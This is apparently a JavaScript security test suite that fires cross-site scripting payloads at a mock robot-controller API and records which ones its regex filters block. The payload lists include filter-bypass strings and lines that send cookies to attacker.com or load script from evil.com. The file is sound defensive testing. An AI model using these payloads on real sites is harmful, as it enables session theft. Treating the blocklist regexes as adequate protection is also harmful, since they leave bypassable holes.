/**
 * Cross-Site Scripting (XSS) Security Testing Suite
 * Arctos Robot Controller - XSS Vulnerability Assessment
 *
 * Comprehensive XSS testing including:
 * - Reflected XSS attacks
 * - Stored XSS attacks
 * - DOM-based XSS attacks
 * - XSS filter bypass techniques
 * - Content Security Policy (CSP) validation
 * - Input sanitization testing
 * - Output encoding verification
 */

const test = require('node:test');
const assert = require('node:assert');
const request = require('supertest');
const express = require('express');
const fs = require('fs-extra');
const path = require('path');

// Import security modules
const { authService, authenticateToken } = require('../../lib/auth');
const { securityHeaders, sanitizeInput } = require('../../lib/security');
const { logger } = require('../../lib/logger');

class XSSTestRunner {
  constructor() {
    this.xssAttempts = [];
    this.successfulXSS = [];
    this.blockedXSS = [];
    this.bypassAttempts = [];
    this.testResults = {};
  }

  recordXSSAttempt(type, payload, blocked, context = null) {
    const attempt = {
      type,
      payload,
      blocked,
      context,
      timestamp: new Date().toISOString(),
    };

    this.xssAttempts.push(attempt);

    if (blocked) {
      this.blockedXSS.push(attempt);
    } else {
      this.successfulXSS.push(attempt);
    }
  }

  recordBypassAttempt(technique, payload, success, details = null) {
    this.bypassAttempts.push({
      technique,
      payload,
      success,
      details,
      timestamp: new Date().toISOString(),
    });
  }

  generateXSSReport() {
    return {
      summary: {
        totalAttempts: this.xssAttempts.length,
        successfulXSS: this.successfulXSS.length,
        blockedXSS: this.blockedXSS.length,
        bypassAttempts: this.bypassAttempts.length,
        protectionEffectiveness: Math.round(
          (this.blockedXSS.length / this.xssAttempts.length) * 100
        ),
      },
      xssAttempts: this.xssAttempts,
      successfulAttacks: this.successfulXSS,
      blockedAttacks: this.blockedXSS,
      bypassAttempts: this.bypassAttempts,
      testResults: this.testResults,
      timestamp: new Date().toISOString(),
    };
  }
}

const xssTestRunner = new XSSTestRunner();

// Mock application with XSS protection
function createXSSTestApp() {
  const app = express();
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));
  app.use(securityHeaders);

  // Search endpoint (potential reflected XSS)
  app.get('/api/search', (req, res) => {
    const query = req.query.q || '';

    // Basic XSS protection - check for script tags
    const xssPatterns = [
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<img.*onerror/gi,
      /<svg.*onload/gi,
      /expression\s*\(/gi,
      /<iframe/gi,
    ];

    let blocked = false;
    for (const pattern of xssPatterns) {
      if (pattern.test(query)) {
        blocked = true;
        logger.security('XSS attempt detected in search', { query, ip: req.ip });
        return res.status(400).json({
          success: false,
          error: 'Invalid search query detected',
        });
      }
    }

    // If not blocked, echo the query back (vulnerable to XSS if not properly escaped)
    res.json({
      success: true,
      query: query, // This would be vulnerable in real HTML context
      results: [`Search results for: ${query}`],
      blocked,
    });
  });

  // Profile endpoint (potential stored XSS)
  app.post('/api/profile/update', authenticateToken, (req, res) => {
    const { displayName, bio, location } = req.body;

    // XSS protection for profile fields
    const fields = { displayName, bio, location };
    const sanitizedFields = {};

    for (const [key, value] of Object.entries(fields)) {
      if (value) {
        // Basic HTML tag removal
        const cleaned = value.replace(/<[^>]*>/g, '');

        // Check for XSS patterns
        const xssFound = /<script|javascript:|on\w+=/i.test(value);

        if (xssFound) {
          logger.security('XSS attempt in profile update', {
            field: key,
            value,
            user: req.user.username,
            ip: req.ip,
          });
          return res.status(400).json({
            success: false,
            error: `Invalid content in ${key} field`,
          });
        }

        sanitizedFields[key] = cleaned;
      }
    }

    res.json({
      success: true,
      profile: sanitizedFields,
    });
  });

  // Comment submission (another stored XSS vector)
  app.post('/api/comments', authenticateToken, (req, res) => {
    const { content, robotId } = req.body;

    if (!content || !robotId) {
      return res.status(400).json({
        success: false,
        error: 'Content and robotId required',
      });
    }

    // Advanced XSS detection
    const advancedXSSPatterns = [
      // Script tags with various encodings
      /<script[\s\S]*?<\/script>/gi,
      /&lt;script[\s\S]*?&lt;\/script&gt;/gi,
      /%3Cscript[\s\S]*?%3C\/script%3E/gi,

      // Event handlers
      /on\w+\s*=\s*["'][^"']*["']/gi,
      /on\w+\s*=\s*[^>\s]+/gi,

      // JavaScript URLs
      /javascript\s*:/gi,
      /j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t\s*:/gi,

      // Data URLs with script content
      /data:.*script/gi,

      // Expression attacks (IE)
      /expression\s*\(/gi,

      // Import statements
      /@import/gi,

      // Style with expression
      /style\s*=.*expression/gi,
    ];

    let xssDetected = false;
    for (const pattern of advancedXSSPatterns) {
      if (pattern.test(content)) {
        xssDetected = true;
        break;
      }
    }

    if (xssDetected) {
      logger.security('Advanced XSS attempt in comment', {
        content,
        robotId,
        user: req.user.username,
        ip: req.ip,
      });
      return res.status(400).json({
        success: false,
        error: 'Comment content contains potentially dangerous code',
      });
    }

    res.json({
      success: true,
      comment: {
        id: Date.now(),
        content,
        robotId,
        author: req.user.username,
        timestamp: new Date().toISOString(),
      },
    });
  });

  return app;
}

test('Reflected XSS Attack Testing', async t => {
  console.log('\n🔍 Testing Reflected XSS Attacks');

  await t.test('should block basic script tag XSS attacks', async () => {
    const app = createXSSTestApp();

    const basicXSSPayloads = [
      '<script>alert("XSS")</script>',
      '<script>document.cookie="hacked"</script>',
      '<script>window.location="http://evil.com"</script>',
      '<script>fetch("http://attacker.com/steal?data="+document.cookie)</script>',
      '<script src="http://evil.com/malicious.js"></script>',
    ];

    for (const payload of basicXSSPayloads) {
      const response = await request(app).get('/api/search').query({ q: payload });

      const blocked = response.status === 400;
      xssTestRunner.recordXSSAttempt('reflected', payload, blocked, 'basic script tag');

      if (blocked) {
        assert.equal(response.body.success, false);
        assert.ok(response.body.error.includes('Invalid'));
      } else {
        // If not blocked, the payload should not be reflected unescaped
        assert.ok(!response.body.query.includes('<script>'));
      }
    }

    console.log(`   🛡️  Tested ${basicXSSPayloads.length} basic XSS payloads`);
  });

  await t.test('should block event handler XSS attacks', async () => {
    const app = createXSSTestApp();

    const eventHandlerPayloads = [
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<div onclick="alert(\'XSS\')">Click me</div>',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      '<iframe onload="alert(\'XSS\')"></iframe>',
      '<video onerror="alert(\'XSS\')" src="invalid">',
      '<audio onerror="alert(\'XSS\')" src="invalid">',
    ];

    for (const payload of eventHandlerPayloads) {
      const response = await request(app).get('/api/search').query({ q: payload });

      const blocked = response.status === 400;
      xssTestRunner.recordXSSAttempt('reflected', payload, blocked, 'event handler');

      if (blocked) {
        assert.equal(response.body.success, false);
      }
    }

    console.log(`   🛡️  Tested ${eventHandlerPayloads.length} event handler XSS payloads`);
  });

  await t.test('should block javascript URL XSS attacks', async () => {
    const app = createXSSTestApp();

    const javascriptURLPayloads = [
      'javascript:alert("XSS")',
      'javascript:document.cookie="stolen"',
      'javascript:eval("alert(\'XSS\')")',
      'javascript:window.open("http://evil.com")',
      'j a v a s c r i p t:alert("XSS")', // Spaced encoding
      'JaVaScRiPt:alert("XSS")', // Case variation
      '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert("XSS")', // HTML entity encoding
    ];

    for (const payload of javascriptURLPayloads) {
      const response = await request(app).get('/api/search').query({ q: payload });

      const blocked = response.status === 400;
      xssTestRunner.recordXSSAttempt('reflected', payload, blocked, 'javascript URL');

      if (blocked) {
        assert.equal(response.body.success, false);
      }
    }

    console.log(`   🛡️  Tested ${javascriptURLPayloads.length} JavaScript URL XSS payloads`);
  });
});

test('Stored XSS Attack Testing', async t => {
  console.log('\n💾 Testing Stored XSS Attacks');

  await t.test('should sanitize profile fields against XSS', async () => {
    const app = createXSSTestApp();

    const userToken = await authService.generateToken({
      id: 2,
      username: 'testuser',
      role: 'operator',
    });

    const profileXSSPayloads = [
      {
        displayName: '<script>alert("XSS in name")</script>',
        bio: 'Normal bio',
        location: 'Normal location',
      },
      {
        displayName: 'Normal name',
        bio: '<img src=x onerror="alert(\'XSS in bio\')">',
        location: 'Normal location',
      },
      {
        displayName: 'Normal name',
        bio: 'Normal bio',
        location: '<svg onload="alert(\'XSS in location\')">',
      },
      {
        displayName: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        bio: '<video><source onerror="alert(\'XSS\')">',
        location: '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
      },
    ];

    for (const payload of profileXSSPayloads) {
      const response = await request(app)
        .post('/api/profile/update')
        .set('Authorization', `Bearer ${userToken}`)
        .send(payload);

      const blocked = response.status === 400;
      const hasXSSField = Object.values(payload).some(val =>
        /<script|javascript:|on\w+=/i.test(val)
      );

      if (hasXSSField) {
        xssTestRunner.recordXSSAttempt(
          'stored',
          JSON.stringify(payload),
          blocked,
          'profile fields'
        );

        if (blocked) {
          assert.equal(response.body.success, false);
          assert.ok(response.body.error.includes('Invalid content'));
        }
      }
    }

    console.log(`   🛡️  Tested ${profileXSSPayloads.length} stored XSS in profile fields`);
  });

  await t.test('should validate comment content against advanced XSS', async () => {
    const app = createXSSTestApp();

    const userToken = await authService.generateToken({
      id: 2,
      username: 'testuser',
      role: 'operator',
    });

    const advancedXSSPayloads = [
      // Encoded script tags
      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      '%3Cscript%3Ealert("XSS")%3C/script%3E',

      // CSS-based XSS
      '<style>@import"javascript:alert(\'XSS\')";</style>',
      '<div style="background:url(javascript:alert(\'XSS\'))">',

      // Data URI XSS
      '<img src="data:text/html,<script>alert(\'XSS\')</script>">',

      // Expression-based XSS (IE)
      '<div style="width:expression(alert(\'XSS\'))">',

      // Template injection attempts
      '{{constructor.constructor("alert(\'XSS\')")()}}',
      '${alert("XSS")}',

      // Unicode and encoding bypasses
      '<script>\\u0061lert("XSS")</script>',
      '<script>\\x61lert("XSS")</script>',

      // Filter bypass techniques
      '<script>alert`XSS`</script>',
      '<script>(alert)(1)</script>',
      '<script>[]["filter"]["constructor"]("alert(\'XSS\')")()};</script>',
    ];

    for (const payload of advancedXSSPayloads) {
      const response = await request(app)
        .post('/api/comments')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          content: payload,
          robotId: 'robot-1',
        });

      const blocked = response.status === 400;
      xssTestRunner.recordXSSAttempt('stored', payload, blocked, 'advanced comment XSS');

      if (blocked) {
        assert.equal(response.body.success, false);
        assert.ok(response.body.error.includes('dangerous code'));
      }
    }

    console.log(`   🛡️  Tested ${advancedXSSPayloads.length} advanced XSS payloads in comments`);
  });
});

test('XSS Filter Bypass Testing', async t => {
  console.log('\n🔄 Testing XSS Filter Bypass Techniques');

  await t.test('should test encoding bypass techniques', async () => {
    const app = createXSSTestApp();

    const encodingBypassPayloads = [
      // HTML entity encoding
      '&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;',

      // URL encoding
      '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',

      // Double URL encoding
      '%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E',

      // Hex encoding
      '\\x3Cscript\\x3Ealert(\\x27XSS\\x27)\\x3C/script\\x3E',

      // Unicode encoding
      '\\u003Cscript\\u003Ealert(\\u0027XSS\\u0027)\\u003C/script\\u003E',

      // Octal encoding
      '\\74script\\76alert(\\47XSS\\47)\\74/script\\76',

      // Mixed case
      '<ScRiPt>ALeRt("XSS")</ScRiPt>',

      // With null bytes (should be filtered)
      '<script\\x00>alert("XSS")</script>',
    ];

    for (const payload of encodingBypassPayloads) {
      const response = await request(app).get('/api/search').query({ q: payload });

      const bypassed =
        response.status === 200 && response.body.success && response.body.query.includes(payload);

      xssTestRunner.recordBypassAttempt('encoding', payload, bypassed);

      // Should be blocked or properly encoded
      if (response.status === 200) {
        assert.equal(response.body.success, true);
        // Verify the payload is not reflected unencoded
        assert.ok(!response.body.query.includes('<script>'));
      }
    }

    console.log(`   🔄 Tested ${encodingBypassPayloads.length} encoding bypass techniques`);
  });

  await t.test('should test context-breaking bypass attempts', async () => {
    const app = createXSSTestApp();

    const userToken = await authService.generateToken({
      id: 2,
      username: 'testuser',
      role: 'operator',
    });

    const contextBreakingPayloads = [
      // Breaking out of attributes
      '" onmouseover="alert(\'XSS\');"',
      "' onclick=\"alert('XSS');\"",

      // Breaking out of script context
      '</script><script>alert("XSS")</script>',

      // Breaking out of style context
      '</style><script>alert("XSS")</script>',

      // Comment breaking
      '--><script>alert("XSS")</script><!--',

      // CDATA breaking
      ']]><script>alert("XSS")</script><![CDATA[',

      // Template breaking
      '}}}<script>alert("XSS")</script>{{{',
    ];

    for (const payload of contextBreakingPayloads) {
      const response = await request(app)
        .post('/api/comments')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          content: `Normal comment with ${payload}`,
          robotId: 'robot-1',
        });

      const bypassed = response.status === 200 && response.body.success;

      xssTestRunner.recordBypassAttempt('context-breaking', payload, bypassed);

      if (response.status === 400) {
        assert.equal(response.body.success, false);
      }
    }

    console.log(
      `   🔄 Tested ${contextBreakingPayloads.length} context-breaking bypass techniques`
    );
  });
});

test('Content Security Policy (CSP) Validation', async t => {
  console.log('\n🛡️ Testing Content Security Policy');

  await t.test('should validate CSP headers are present', async () => {
    const app = createXSSTestApp();

    const response = await request(app).get('/api/search').query({ q: 'test' });

    const cspHeader = response.headers['content-security-policy'];

    assert.ok(cspHeader, 'CSP header should be present');

    // Check for important CSP directives
    const requiredDirectives = ['default-src', 'script-src', 'style-src', 'img-src', 'connect-src'];

    let validDirectives = 0;
    for (const directive of requiredDirectives) {
      if (cspHeader.includes(directive)) {
        validDirectives++;
      }
    }

    const cspStrength = validDirectives / requiredDirectives.length;

    xssTestRunner.testResults.csp_validation = {
      present: !!cspHeader,
      header: cspHeader,
      validDirectives,
      totalDirectives: requiredDirectives.length,
      strength: Math.round(cspStrength * 100),
    };

    console.log(`   🛡️  CSP Header: ${cspHeader}`);
    console.log(`   📊 CSP Strength: ${Math.round(cspStrength * 100)}%`);

    assert.ok(cspStrength >= 0.6, 'CSP should include at least 60% of important directives');
  });
});

// Generate comprehensive XSS testing report
test('Generate XSS Security Report', async t => {
  console.log('\n📋 Generating XSS Security Test Report...');

  const report = xssTestRunner.generateXSSReport();
  const reportPath = path.join(__dirname, '../../test-results/security');

  fs.ensureDirSync(reportPath);

  const reportFile = path.join(reportPath, `xss-security-report-${Date.now()}.json`);
  fs.writeJsonSync(reportFile, report, { spaces: 2 });

  console.log(`\n✅ XSS Security Report Generated: ${reportFile}`);
  console.log(`📊 Protection Effectiveness: ${report.summary.protectionEffectiveness}%`);
  console.log(`🛡️  Blocked Attacks: ${report.summary.blockedXSS}/${report.summary.totalAttempts}`);
  console.log(`⚠️  Successful Attacks: ${report.summary.successfulXSS}`);
  console.log(`🔄 Bypass Attempts: ${report.summary.bypassAttempts}`);

  if (report.summary.successfulXSS > 0) {
    console.log(`\n🚨 CRITICAL: ${report.summary.successfulXSS} XSS vulnerabilities found!`);
    report.successfulAttacks.forEach((attack, index) => {
      console.log(`   ${index + 1}. [${attack.type.toUpperCase()}] ${attack.payload}`);
    });
  } else {
    console.log('\n✅ No successful XSS attacks detected');
  }

  // XSS protection assessment
  if (report.summary.protectionEffectiveness >= 95) {
    console.log('🏆 EXCELLENT: XSS protection is highly effective');
  } else if (report.summary.protectionEffectiveness >= 85) {
    console.log('✅ GOOD: XSS protection is effective with minor gaps');
  } else if (report.summary.protectionEffectiveness >= 70) {
    console.log('⚠️  MODERATE: XSS protection needs improvement');
  } else {
    console.log('🔴 POOR: XSS protection is insufficient - immediate attention required');
  }
});
